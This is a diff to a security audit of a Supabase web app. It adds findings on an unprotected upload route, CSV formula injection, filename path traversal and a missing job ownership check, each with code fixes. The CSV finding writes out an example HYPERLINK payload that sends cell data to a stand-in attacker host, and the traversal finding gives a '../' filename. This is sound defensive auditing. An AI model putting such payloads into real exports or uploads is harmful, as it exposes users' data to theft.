@@ -27,18 +27,22 @@
 | 4 | 🟠 HIGH | Edge Function | `weekly-digest` has no authentication — unauthenticated mass email blast |
 | 5 | 🟠 HIGH | Edge Function | `backfill-scores` and `bulk-rescore` have no admin check — DoS via expensive operations |
 | 6 | 🟠 HIGH | Edge Function | `backfill-zips` has no authentication at all |
-| 7 | 🟠 HIGH | Edge Function | No rate limiting on any endpoint — brute force & abuse risk |
-| 8 | 🟠 HIGH | CORS | `Access-Control-Allow-Origin: *` on all state-mutating functions |
-| 9 | 🟡 MEDIUM | Edge Function | `delete-user-account` leaks full DB schema in error responses |
-| 10 | 🟡 MEDIUM | Secrets | Hardcoded Supabase anon key and URL in source code |
-| 11 | 🟡 MEDIUM | XSS | `chart.tsx` `dangerouslySetInnerHTML` with partially user-influenced `id` prop |
-| 12 | 🟡 MEDIUM | Email | `weekly-digest` `from` address hardcoded to Lovable staging domain |
-| 13 | 🟡 MEDIUM | Auth | Role caching in `localStorage` without expiry — stale role data after role change |
-| 14 | 🟡 MEDIUM | Crypto | `x-internal-secret` compared with `===` instead of constant-time comparison |
-| 15 | 🔵 LOW | Auth | Dual password-reset paths create confusion; edge function requires active session |
-| 16 | 🔵 LOW | Secrets | Stripe error response reflects `tier_name` back to user verbatim |
-| 17 | 🔵 LOW | Database | Some SECURITY DEFINER functions lack explicit `SET search_path` |
-| 18 | 🔵 LOW | Dependencies | Mixed Deno std library versions across edge functions |
+| 7 | 🟠 HIGH | Upload | `/upload` route unprotected — unauthenticated storage abuse |
+| 8 | 🟠 HIGH | Export | `export-csv` missing formula-injection sanitization — CSV/DDE attack |
+| 9 | 🟠 HIGH | Edge Function | No rate limiting on any endpoint — brute force & abuse risk |
+| 10 | 🟠 HIGH | CORS | `Access-Control-Allow-Origin: *` on all state-mutating functions |
+| 11 | 🟡 MEDIUM | Edge Function | `delete-user-account` leaks full DB schema in error responses |
+| 12 | 🟡 MEDIUM | Secrets | Hardcoded Supabase anon key and URL in source code |
+| 13 | 🟡 MEDIUM | XSS | `chart.tsx` `dangerouslySetInnerHTML` with partially user-influenced `id` prop |
+| 14 | 🟡 MEDIUM | Email | `weekly-digest` `from` address hardcoded to Lovable staging domain |
+| 15 | 🟡 MEDIUM | Auth | Role caching in `localStorage` without expiry — stale role data after role change |
+| 16 | 🟡 MEDIUM | Crypto | `x-internal-secret` compared with `===` instead of constant-time comparison |
+| 17 | 🟡 MEDIUM | Upload | `sanitizeFilename` does not block `../` path traversal sequences |
+| 18 | 🟡 MEDIUM | Upload | `process-upload` does not validate job ownership |
+| 19 | 🔵 LOW | Auth | Dual password-reset paths create confusion; edge function requires active session |
+| 20 | 🔵 LOW | Secrets | Stripe error response reflects `tier_name` back to user verbatim |
+| 21 | 🔵 LOW | Database | Some SECURITY DEFINER functions lack explicit `SET search_path` |
+| 22 | 🔵 LOW | Dependencies | Mixed Deno std library versions across edge functions |
 
 ---
 
@@ -622,6 +626,171 @@ Standardize all functions to use the same (latest stable) Deno std version. Pin 
 
 ---
 
+---
+
+## Finding 19 — 🟠 HIGH: `/upload` Route Has No Authentication — Unauthenticated Uploads Allowed
+
+**File:** `src/App.tsx:51` and `src/pages/Upload.tsx:44-45`
+
+### What's wrong
+
+The `/upload` route is completely unprotected:
+
+```tsx
+// App.tsx line 51 — no ProtectedRoute or RoleProtectedRoute
+<Route path="/upload" element={<Upload />} />
+```
+
+And the Upload page falls back to a literal string `'anonymous-user'` when no session exists:
+
+```typescript
+// Upload.tsx lines 44-45
+const { user } = useAuth();
+const effectiveUserId = user?.id || 'anonymous-user'; // ← any visitor becomes this
+```
+
+The `createUploadJob` service then uses `effectiveUserId` as the storage path prefix — so files land at `anonymous-user/{timestamp}-filename.csv` in Supabase Storage. The `process-upload` edge function has `verify_jwt = true`, so it won't process the job — but the **file is already uploaded to storage** and **a row is inserted into `upload_jobs`** with `user_id = 'anonymous-user'`.
+
+### Attack scenario
+
+1. Unauthenticated attacker visits `/upload` — no redirect to login
+2. Uploads 100× 15MB CSVs — 1.5GB of data lands in Supabase Storage billed to the account
+3. `upload_jobs` table fills with orphaned rows under `anonymous-user`
+4. Storage quota exhausted → legitimate uploads start failing
+
+### Fix
+
+Wrap the Upload route in a `ProtectedRoute`:
+```tsx
+<Route path="/upload" element={
+  <ProtectedRoute>
+    <Upload />
+  </ProtectedRoute>
+} />
+```
+
+And remove the `|| 'anonymous-user'` fallback — throw if `user` is null.
+
+---
+
+## Finding 20 — 🟠 HIGH: `export-csv` Does Not Sanitize Formula-Injection Characters
+
+**File:** `supabase/functions/export-csv/index.ts:415-422`
+
+### What's wrong
+
+The `escapeCSV` function wraps values containing commas, newlines, and quotes — but does **not** strip or prefix formula-triggering characters (`=`, `+`, `-`, `@`, `|`) at the start of field values:
+
+```typescript
+function escapeCSV(value: string): string {
+  if (!value) return '';
+  // Wraps commas/newlines/quotes — but NOT formula chars
+  if (value.includes(',') || value.includes('\n') || value.includes('"')) {
+    return `"${value.replace(/"/g, '""')}"`;
+  }
+  return value;  // ← returns '=cmd|...' verbatim
+}
+```
+
+Violation data originates from uploaded CSVs processed by `process-upload`, which stores `violation_type`, `description`, and `raw_description` fields directly from user-supplied data without sanitization.
+
+### Attack scenario (CSV injection / DDE injection)
+
+1. Malicious data source provides a CSV with a violation description starting with: `=HYPERLINK("http://attacker.com/steal?d="&A1,"Click here")`
+2. `process-upload` stores this verbatim in `violations.description`
+3. A legitimate user runs an export via `export-csv`
+4. The user opens the exported CSV in Microsoft Excel
+5. Excel evaluates the formula — silently exfiltrates data to `attacker.com`, or on older Excel versions, executes the DDE command
+
+This affects the exported data of every legitimate customer.
+
+### Fix
+
+Prepend a tab character to any field starting with a formula character:
+
+```typescript
+function escapeCSV(value: string): string {
+  if (!value) return '';
+  // Prevent CSV formula injection (DDE attacks)
+  if (/^[=+\-@|]/.test(value)) {
+    value = '\t' + value; // Tab prefix neutralizes formula evaluation
+  }
+  if (value.includes(',') || value.includes('\n') || value.includes('"')) {
+    return `"${value.replace(/"/g, '""')}"`;
+  }
+  return value;
+}
+```
+
+---
+
+## Finding 21 — 🟡 MEDIUM: `sanitizeFilename` Does Not Block Path Traversal Sequences
+
+**File:** `src/utils/sanitizeFilename.ts:20-29`
+
+### What's wrong
+
+The filename sanitizer removes brackets, quotes, and invalid path characters — but **does not block `..` (dot-dot) sequences or `/` forward slashes**:
+
+```typescript
+const sanitized = name
+  .replace(/["']/g, '')
+  .replace(/[()[\]{}]/g, '')
+  .replace(/\s+/g, '_')
+  .replace(/[<>:|?*]/g, '-')  // ← '/' and '..' not blocked
+  .replace(/\./g, '_')
+  ...
+```
+
+The storage path is constructed as `${userId}/${timestamp}-${sanitizedFilename}`. While the `userId` prefix provides some isolation, a filename like `../../bucket-root/admin.csv` could potentially navigate outside the intended folder depending on how Supabase Storage resolves paths.
+
+### Fix
+
+Add explicit traversal protection:
+```typescript
+.replace(/\.\./g, '')   // Block ..
+.replace(/\//g, '_')    // Block /
+.replace(/\\/g, '_')    // Block \
+```
+
+---
+
+## Finding 22 — 🟡 MEDIUM: `process-upload` Does Not Validate Job Ownership
+
+**File:** `supabase/functions/process-upload/index.ts` (~line 510)
+
+### What's wrong
+
+`process-upload` uses the service role key (bypassing RLS) to fetch upload jobs by ID, without checking that the calling user owns the job:
+
+```typescript
+const supabaseClient = createClient(
+  Deno.env.get('SUPABASE_URL') ?? '',
+  Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''  // ← RLS bypassed
+);
+
+// Fetches any job ID — no ownership check
+const { data: job } = await supabaseClient
+  .from('upload_jobs')
+  .select('*')
+  .eq('id', jobId)
+  .single();
+// Missing: if (job.user_id !== currentUserId) return 403
+```
+
+An attacker who enumerates or guesses another user's job UUID can trigger re-processing on their upload, potentially observing error messages that leak city/state/file metadata.
+
+### Fix
+
+Extract the authenticated user from the JWT and validate ownership:
+```typescript
+if (job.user_id !== authenticatedUserId) {
+  return new Response(JSON.stringify({ error: 'Forbidden' }), { status: 403 });
+}
+```
+
+---
+
 ## Summary: What Needs Fixing Before Launch
 
 ### Immediate — fix before any real users or data enter the system:
@@ -631,22 +800,26 @@ Standardize all functions to use the same (latest stable) Deno std version. Pin 
 3. **Add `auth.uid()` check to `fn_increment_trial_exports`** — prevents targeted trial quota exhaustion against other users
 4. **Add authentication to `weekly-digest`** — prevents unauthenticated mass email spam
 5. **Add admin-only auth guards to `backfill-scores`, `bulk-rescore`, and `backfill-zips`** — prevents computational DoS by non-admin users
+6. **Wrap `/upload` in `ProtectedRoute`** — unauthenticated visitors can upload 15MB files, exhausting storage quota
+7. **Fix `escapeCSV` to sanitize formula-injection characters** — prevents CSV/DDE injection in exported data
 
 ### Short-term (fix within first week):
 
-6. Add rate limiting to `send-password-reset`, `send-support-message`, and `create-checkout-session`
-7. Restrict `Access-Control-Allow-Origin` to the production domain
-8. Strip `deletionResults` from `delete-user-account` response
-9. Fix weekly-digest `from` address to `digest@snapignite.com`
-10. Remove hardcoded Supabase credentials from `externalClient.ts`
+8. Add rate limiting to `send-password-reset`, `send-support-message`, and `create-checkout-session`
+9. Restrict `Access-Control-Allow-Origin` to the production domain
+10. Strip `deletionResults` from `delete-user-account` response
+11. Fix weekly-digest `from` address to `digest@snapignite.com`
+12. Remove hardcoded Supabase credentials from `externalClient.ts`
+13. Add job ownership validation to `process-upload`
+14. Add path traversal protection to `sanitizeFilename`
 
 ### Backlog (harden over time):
 
-11. Replace `===` with constant-time comparison for `x-internal-secret` checks
-12. Sanitize chart `id` before CSS template interpolation
-13. Add TTL to localStorage role cache
-14. Standardize Deno std library version across all functions
-15. Add `SET search_path = public` to any remaining SECURITY DEFINER functions without it
+15. Replace `===` with constant-time comparison for `x-internal-secret` checks
+16. Sanitize chart `id` before CSS template interpolation
+17. Add TTL to localStorage role cache
+18. Standardize Deno std library version across all functions
+19. Add `SET search_path = public` to any remaining SECURITY DEFINER functions without it
 
 ---
 
